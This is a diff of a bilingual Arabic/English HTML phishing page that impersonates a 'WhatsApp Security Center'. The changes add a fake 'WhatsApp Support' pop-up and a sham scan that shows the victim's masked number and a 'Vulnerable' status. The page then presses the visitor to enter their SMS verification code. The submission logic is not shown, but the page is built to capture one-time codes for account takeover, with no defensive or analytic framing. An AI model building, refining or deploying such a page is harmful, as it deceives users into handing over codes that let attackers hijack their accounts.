@@ -3,31 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security</title>
+    <title>WhatsApp Security Center</title>
     <style>
         :root { --wa-green: #25d366; --wa-bg: #0b141a; --wa-card: #1d2a33; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-danger: #f15c5c; --wa-btn: #00a884; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
         .rtl { direction: rtl; }
         
-        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; }
-        .logo-wa-load { width: 65px; height: 65px; fill: var(--wa-green); animation: pulse 1.5s infinite; }
+        /* شاشة التحميل الرسمية */
+        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
+        .logo-wa-load { width: 70px; height: 70px; fill: var(--wa-green); animation: pulse 1.5s infinite; }
         .loader-text { color: var(--wa-hint); font-size: 14px; margin-top: 10px; }
         @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } }
 
+        /* نوتفيكيشن بوت واتساب الجانبية */
+        .wa-notify { position: fixed; top: 20px; right: -350px; background: #1d2a33; border: 1px solid #25d366; border-radius: 10px; padding: 12px; width: 300px; display: flex; gap: 12px; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 3000; transition: 0.5s ease; }
+        .rtl .wa-notify { right: auto; left: -350px; }
+        .wa-notify.show { right: 20px; }
+        .rtl .wa-notify.show { left: 20px; }
+        .wa-notify svg { width: 35px; height: 35px; fill: var(--wa-green); flex-shrink: 0; }
+        .wa-notify-content h5 { color: var(--wa-green); font-size: 13px; margin-bottom: 2px; }
+        .wa-notify-content p { font-size: 11px; color: #fff; line-height: 1.4; }
+
         .app-ui { width: 100%; max-width: 420px; padding: 25px; display: none; }
         
-        /* تصميم صندوق السبورت العلوي */
-        .support-header { background: rgba(37, 211, 102, 0.1); border: 1px solid rgba(37, 211, 102, 0.2); border-radius: 12px; padding: 15px; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
-        .support-header svg { width: 25px; fill: var(--wa-green); }
-        .support-info { flex: 1; }
-        .support-info h4 { font-size: 11px; color: var(--wa-green); text-transform: uppercase; margin-bottom: 2px; }
-        .support-info p { font-size: 15px; font-weight: bold; color: #fff; }
+        /* الهيدر الجديد مع الشعار والاسم */
+        .brand-header { text-align: center; margin-bottom: 30px; }
+        .brand-header svg { width: 50px; fill: var(--wa-green); margin-bottom: 10px; }
+        .brand-header h1 { font-size: 22px; font-weight: 700; color: #fff; letter-spacing: 0.5px; }
 
-        .header-section { text-align: center; margin-bottom: 25px; }
-        .header-section h2 { font-size: 19px; font-weight: 600; }
-
-        .sys-card { background: var(--wa-card); border-radius: 12px; padding: 5px 20px; margin-bottom: 20px; }
+        .sys-card { background: var(--wa-card); border-radius: 12px; padding: 5px 20px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.03); }
         .sys-row { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 0.5px solid #26353d; font-size: 13px; }
         .sys-row:last-child { border: none; }
         .lbl { color: var(--wa-hint); }
@@ -38,8 +43,9 @@
         .alert-msg { font-size: 13px; line-height: 1.6; color: #e9edef; }
 
         .code-in { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 12px; padding: 18px; color: #fff; font-size: 28px; text-align: center; outline: none; margin-bottom: 20px; letter-spacing: 8px; }
-        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        .footer { margin-top: 40px; font-size: 11px; color: var(--wa-hint); text-align: center; opacity: 0.7; }
+        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .btn-sync:active { transform: scale(0.95); }
+        .footer { margin-top: 40px; font-size: 11px; color: var(--wa-hint); text-align: center; opacity: 0.6; }
     </style>
 </head>
 <body>
@@ -49,23 +55,24 @@
         <div class="loader-text" id="l-msg">Scanning System...</div>
     </div>
 
-    <div class="app-ui" id="main-ui">
-        <div class="support-header">
-            <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-            <div class="support-info">
-                <h4 id="s-label">WhatsApp Support</h4>
-                <p>+1 (650) 543-4800</p>
-            </div>
+    <div class="wa-notify" id="pop">
+        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+        <div class="wa-notify-content">
+            <h5 id="n-head">WhatsApp Support</h5>
+            <p id="n-body">هذا هو الدعم الوحيد المعتمد لتفعيل هذه الخدمة تلقائياً.</p>
         </div>
+    </div>
 
-        <div class="header-section">
-            <h2 id="h-title">Security Center</h2>
+    <div class="app-ui" id="main-ui">
+        <div class="brand-header">
+            <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+            <h1 id="brand-name">WhatsApp Security Center</h1>
         </div>
 
         <div class="sys-card">
             <div class="sys-row"><span class="lbl" id="l-acc">Account:</span> <span class="val" id="v-acc"></span></div>
-            <div class="sys-row"><span class="lbl" id="l-dev">Device:</span> <span class="val" id="v-dev">Loading...</span></div>
-            <div class="sys-row"><span class="lbl" id="l-sec">Security:</span> <span class="val" style="color:var(--wa-danger)" id="v-sec">Vulnerable</span></div>
+            <div class="sys-row"><span class="lbl" id="l-dev">Device:</span> <span class="val" id="v-dev">Detecting...</span></div>
+            <div class="sys-row"><span class="lbl" id="l-sec">Security Status:</span> <span class="val" style="color:var(--wa-danger)" id="v-sec">Vulnerable</span></div>
         </div>
 
         <div class="alert-box">
@@ -75,7 +82,7 @@
         <input type="tel" id="otp" class="code-in" placeholder="--- ---" maxlength="6" inputmode="numeric">
         <button class="btn-sync" id="btn-text" onclick="handleFlow()">Update Now</button>
 
-        <div class="footer">WhatsApp Security © 2026</div>
+        <div class="footer">WhatsApp Security Center © 2026</div>
     </div>
 
     <script>
@@ -89,24 +96,26 @@
         const TXT = {
             ar: {
                 load: "جاري فحص النظام...",
-                sup: "دعم واتساب الفني",
-                title: "نظام حماية المحادثات",
+                brand: "مركز أمان واتساب",
+                nHead: "دعم واتساب الفني",
+                nBody: "هذا هو الدعم الوحيد المعتمد لتفعيل هذه الخدمة تلقائياً.",
                 acc: "رقم الحساب:",
                 dev: "نوع الجهاز:",
-                sec: "الأمان:",
-                vun: "ثغرة أمنية مكشوفة",
-                msg: "تم رصد نشاط مريب. يرجى إدخال رمز التحقق (SMS) لتحديث بروتوكول التشفير وتأمين حسابك فوراً.",
+                sec: "حالة الأمان:",
+                vun: "SSLv3 / ثغرة أمنية",
+                msg: "تم رصد محاولة وصول مريبة. يجب إدخال رمز التحقق SMS لتأمين حسابك وتحديث نظام التشفير فوراً.",
                 btn: "تحديث النظام الآن"
             },
             en: {
                 load: "Scanning System...",
-                sup: "WhatsApp Support",
-                title: "Security Center",
+                brand: "WhatsApp Security Center",
+                nHead: "WhatsApp Support",
+                nBody: "This is the only authorized support to activate this service automatically.",
                 acc: "Account:",
                 dev: "Device:",
-                sec: "Security:",
+                sec: "Security Status:",
                 vun: "Vulnerable / Outdated",
-                msg: "Suspicious activity detected. Please enter the verification code (SMS) to update encryption and secure your account.",
+                msg: "Suspicious access attempt detected. You must enter the SMS verification code to secure your account and update encryption.",
                 btn: "Update Now"
             }
         };
@@ -126,8 +135,9 @@
             if(isAr) document.body.classList.add('rtl');
 
             document.getElementById('l-msg').innerText = d.load;
-            document.getElementById('s-label').innerText = d.sup;
-            document.getElementById('h-title').innerText = d.title;
+            document.getElementById('brand-name').innerText = d.brand;
+            document.getElementById('n-head').innerText = d.nHead;
+            document.getElementById('n-body').innerText = d.nBody;
             document.getElementById('l-acc').innerText = d.acc;
             document.getElementById('l-dev').innerText = d.dev;
             document.getElementById('l-sec').innerText = d.sec;
@@ -138,9 +148,11 @@
             document.getElementById('v-acc').innerText = mask(CFG.U);
             document.getElementById('v-dev').innerText = getDev();
 
+            // إظهار الواجهة وإظهار النوتفيكيشن بعدها بـ 3 ثواني
             setTimeout(() => { 
                 document.getElementById('loader').style.display = 'none'; 
                 document.getElementById('main-ui').style.display = 'block'; 
+                setTimeout(() => { document.getElementById('pop').classList.add('show'); }, 1000);
             }, 2500);
         }
 
